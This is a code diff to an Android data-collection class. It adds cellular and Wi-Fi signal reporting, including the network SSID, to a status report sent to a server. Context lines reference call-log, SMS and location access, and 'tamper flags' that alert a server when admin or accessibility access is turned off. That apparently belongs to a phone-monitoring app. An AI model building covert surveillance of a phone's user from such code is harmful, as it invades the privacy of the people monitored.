@@ -7,7 +7,11 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.ApplicationInfo
 import android.location.LocationManager
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
+import android.net.wifi.WifiManager
 import android.os.BatteryManager
+import android.telephony.TelephonyManager
 import android.provider.CallLog
 import android.provider.Settings
 import android.provider.Telephony
@@ -49,13 +53,66 @@ object DataCollector {
         val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
         val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
         val charging = bm.isCharging
-        return JSONObject()
+        val out = JSONObject()
             .put("battery_pct", pct)
             .put("charging", charging)
             .put("locked", Prefs.isLocked(ctx))
             .put("admin_active", isAdminActive(ctx))
             .put("accessibility_active", isAccessibilityActive(ctx))
             .put("notif_listener_active", isNotifListenerActive(ctx))
+        cellular(ctx, out)
+        wifi(ctx, out)
+        return out
+    }
+
+    // Cell: network generation ("5G"/"4G"/...) plus bars (0-4) and dBm. Needs READ_PHONE_STATE.
+    private fun cellular(ctx: Context, out: JSONObject) {
+        try {
+            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+            val gen = when (tm.dataNetworkType) {
+                TelephonyManager.NETWORK_TYPE_NR -> "5G"
+                TelephonyManager.NETWORK_TYPE_LTE -> "4G"
+                TelephonyManager.NETWORK_TYPE_UMTS, TelephonyManager.NETWORK_TYPE_HSDPA,
+                TelephonyManager.NETWORK_TYPE_HSUPA, TelephonyManager.NETWORK_TYPE_HSPA,
+                TelephonyManager.NETWORK_TYPE_HSPAP, TelephonyManager.NETWORK_TYPE_EVDO_0,
+                TelephonyManager.NETWORK_TYPE_EVDO_A, TelephonyManager.NETWORK_TYPE_EVDO_B -> "3G"
+                TelephonyManager.NETWORK_TYPE_GPRS, TelephonyManager.NETWORK_TYPE_EDGE,
+                TelephonyManager.NETWORK_TYPE_CDMA, TelephonyManager.NETWORK_TYPE_1xRTT -> "2G"
+                else -> null
+            }
+            out.put("cell_type", gen)
+            val ss = tm.signalStrength
+            if (ss != null) {
+                out.put("cell_level", ss.level)
+                val dbm = ss.cellSignalStrengths.firstOrNull()?.dbm
+                if (dbm != null && dbm != Int.MAX_VALUE) out.put("cell_dbm", dbm)
+            }
+        } catch (_: SecurityException) {
+            // READ_PHONE_STATE not granted; leave cell fields unset.
+        }
+    }
+
+    // Wi-Fi: SSID, bars (0-4) and RSSI. SSID is only readable with location permission and
+    // location services on; otherwise Android returns "<unknown ssid>", which we drop.
+    @Suppress("DEPRECATION")
+    private fun wifi(ctx: Context, out: JSONObject) {
+        try {
+            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
+            val onWifi = caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
+            out.put("wifi_connected", onWifi)
+            if (!onWifi) return
+            val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+            val info = wm.connectionInfo ?: return
+            val ssid = info.ssid?.trim('"')
+            if (!ssid.isNullOrEmpty() && ssid != WifiManager.UNKNOWN_SSID) out.put("wifi_ssid", ssid)
+            if (info.rssi > -127) {
+                out.put("wifi_rssi", info.rssi)
+                out.put("wifi_level", wm.calculateSignalLevel(info.rssi))
+            }
+        } catch (_: SecurityException) {
+            // Missing permission; leave Wi-Fi fields unset.
+        }
     }
 
     // Tamper flags: reported every tick so the server can alert on a 1 -> 0
